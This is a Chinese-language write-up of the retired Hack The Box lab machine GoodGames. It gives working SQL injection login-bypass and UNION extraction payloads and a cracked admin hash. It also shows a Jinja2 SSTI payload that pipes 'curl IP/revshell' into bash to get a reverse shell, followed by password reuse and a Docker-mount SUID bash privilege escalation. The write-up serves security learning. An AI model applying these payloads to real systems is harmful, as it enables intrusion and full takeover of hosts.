---
title: [HTB] GoodGames Writeup
url: https://mp.weixin.qq.com/s/WPnNpY6Tl-U58vsDGWQvBw
clipped_at: 2024-04-01 17:15:55
category: default
tags: 
 - mp.weixin.qq.com
---


# [HTB] GoodGames Writeup

## 概述 （Overview）

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-49256035d5d297c414998ee4e9327760.png)

> **HOST:** 10.10.11.130
> 
> **OS:** LINUX
> 
> **发布时间:** 2022-02-22
> 
> **完成时间:** 2022-06-14
> 
> **机器作者:** TheCyberGeek
> 
> **困难程度:** easy
> 
> **机器状态:** 退休
> 
> **MACHINE TAGS:** #SQLi #Flask #SSTI #DockerAbuse

## 攻击链 （Kiillchain）

使用 **Nmap** 对目标服务器进行开放端口扫描，访问 Web 服务并使用 **SQLi** 实现管理员账号登录。利用 SQLi 注入漏洞获取新域名系统的登录账号，使用得到的明文密码进入系统。通过中间件服务 **Flask** 框架信息判断存在 **SSTI** 漏洞，最终利用该漏洞进行命令执行成功得到立足点。

通过当前会话 Shell 身份和 IP 地址判断当前处于容器中，利用密码重用风险成功进入物理机环境。最终通过特殊的 **Docker Abuse** 成功完成权限提升。

## 枚举（Enumeration）

老样子，开始还是使用 **Nmap** 工具对目标服务器的开放端口进行扫描。

```plain
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```

仅开放了 http 服务端口，从中能看到三段值得关注的内容。Apache 的版本很低，http-server-header 中泄露了使用的中间件及版本，IP 可以绑定一个 goodgames.htb 域名。

### Port 80 - Flask

浏览器访问目标地址可以看到一个 UI 很酷炫的站点：

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-dc7c7dca9eb7f97fd25b8c7f1cd673fb.png)

注意到右上角存在用户图标，实际点击后发现可以访问注册表单页面。随便填写了一个 `test` 用户进行注册提交，发现能成功。

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-da2eb40420e155104aafa79f33788b8a.png)

### SQLi

使用账号能够成功登录系统，但并没有多出什么不一样的内容。退出会话后尝试 SQLi ，发现存在 SQL 语句闭合进行 admin 账号登录。

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-74648e9bbe116476a083b91436eae110.png)

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-72e936f91b19362c722bcdb004bc8a6e.png)

点击右上角的小齿轮图片会跳转到一个二级地址，随即将该地址加入 hosts 后就能正常浏览了。

> echo '10.10.11.130 internal-administration.goodgames.htb' >> /etc/hosts

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-973876aa2b0d402e21907ca414ebc98c.png)

发现需要特定的账号密码才能登录新系统，接下来就是使用 SQLi 漏洞将 admin 的明文密码取出。偷懒可以使用 sqlmap 工具，但它匹配给我的是延迟注入，遍历的很慢。

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-486e735a506dc792058a56350a50c103.png)

还是复习一遍手工注入好了，温故而知新。首先，通过 `order by` 语句验证表字段长度：

```plain
http --form http://10.10.11.130/login email="' order by 5 -- -" password="' or ''='' -- -" -v | grep -i error
```

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-359fed599546b3a36207095f0f094950.png)

可以看到，通过匹配关键字 `error` 来验证字段长度为 **4**。接着通过联合查询，将查询的字段结果进行自定义内容替换：

```plain
http --form http://10.10.11.130/login email="' union select 111,222,333,444 -- -" password="' or ''='' -- -" -v | grep -i 444
```

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-fb53ed3e370215ccbb61f146a2b8b0c1.png)

通过匹配关键字 `444` ，很容易就锁定到返回字段的结果信息位置。随后进行子查询获取当前数据库名称：

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-59a3b572706e7c4d36923c1f25f03a26.png)

依次获取 main 数据库中的表名称：

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-eab68d3fe8d8664495c5b4c90142f0be.png)

获取 admin 用户的 MD5 密码 hash：

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-c068484d0e8540f6cd627a997140ecb1.png)

在免费的 MD5 解密网站中匹配到明文密码，使用该密码成功登录新系统。

```plain
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator
```

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-85a513acf34ca6837764457739cf5a68.png)

### SSTI

因为已知 Web 应用使用的是 **Flask**，尝试验证是否存在 **SSTI**，随后在 `settings` 功能中找到该漏洞的发生位置。

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-142ff626d365332d3493a43afb0c3cf5.png)

## 立足点（Foothold）

> https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

参考文中出现的 payload 语句，进行构造实现 RCE 执行，成功获取目标服务器立足点：

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-47fed8a43172682ba608881b8bf43a0a.png)

```plain
{{request.application.__globals__.__builtins__.__import__('os').popen('curl IP/revshell | bash').read()}}
```

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-8c3256c998abdfe133ebd039720dd7c9.png)

## 横向移动（Lateral Movement）

一看权限 root 很高兴以为完成了这个靶机，可是只找到 user flag，说明当前 shell 可能是在 Docker 中。使用 `ip` 命令简单查询了下，果然 `172.19.0.1` 才是宿主机。

```plain
ip -4 addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default  link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

通过 wget 简单传递一个编译好的 nc 到容器里，对宿主机进行端口扫描发现开放了两个端口。

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-40d62de46504b1145cffc5cca7454089.png)

通过 curl 请求了下宿主机的 80 端口，发现返回的 title 对应的就是 goodgames.htb 站点。

```plain
curl 172.19.0.1/ | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<!DOCTYPE html>


<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>GoodGames | Community and Store</title>
...snip...
```

因为存在 augustus 用户，所以尝试了一下密码复用，发现能通过 SSH 登录宿主机。

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-d5008780935c35b056d7026a86362281.png)

## 权限提升（Privilege Escalation）

在宿主机的 `/home/augustus` 目录下发现了一个有意思的东西，目录中的文件所有人权限显示的是用户的 ID 而不是名称。

随后查看了容器内的 passwd 文件，里面并没有用户 `agustus` 或用户 ID 为 `1000` 的。说明这个 `/home/augustus` 目录已经从宿主机挂载到容器中（这点通过 `mount` 命令能够看到，而在容器中的体现就是 `-v` 命令）。

这样就存在了一个特殊的 **Docker Abuse**（Docker Abuse 是指恶意利用 Docker 容器环境中的一些漏洞或不安全配置，以达到攻击目标的目的）。

在 Docker 容器中挂载文件后，如果使用了 `chown` 命令将挂载的文件赋予了 **root** 用户和 **root** 组的所有权，并使用 `chmod u+s` 命令设置 **SUID** 位，那么在容器中运行该文件时，进程会以 root 用户身份运行。但当在物理机上执行该文件时，实际上是创建了一个新的进程来运行该文件，并且该进程的权限是由该文件自身权限决定的。由于该文件具有 **SUID** 位，因此操作系统会将该进程的有效**用户 ID（euid）设置为该文件所有者的用户 ID**，即 **root** 用户。因此，在物理机上执行该文件时，该进程被赋予了 **root** 权限，可以访问物理机上的敏感资源或进行潜在危险的操作。

> **euid**（Effective User ID）是一个进程的有效用户 ID，用于权限检查和资源访问控制。每个进程都有一个 euid，通常为当前登录用户的 uid，但是可通过 setuid 等特殊操作改变自身的 euid，使得进程拥有不同于登录用户的权限。进程的 euid 和 egid 用于确定进程的有效权限。

这样一来，提权就变得很简单了。在容器内执行：

```plain
root@3a453ab39d3d:/home/augustus# cp /bin/bash .
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
root@3a453ab39d3d:/home/augustus# chmod u+s bash
```

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-de0b31e38ac31cbb5c4c413906d93f3b.png)

在物理机中执行 `/home/augustus/bash -p` 就完成了最终的权限提升：

![图片](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711962955-9fdd9dbb8fa752acad8bea72cd048b06.png)

## 参考

-   • https://github.com/7Rocky/HackTheBox-scripts/blob/main/Machines/GoodGames/autopwn.py
    
-   • https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/
    
-   • https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
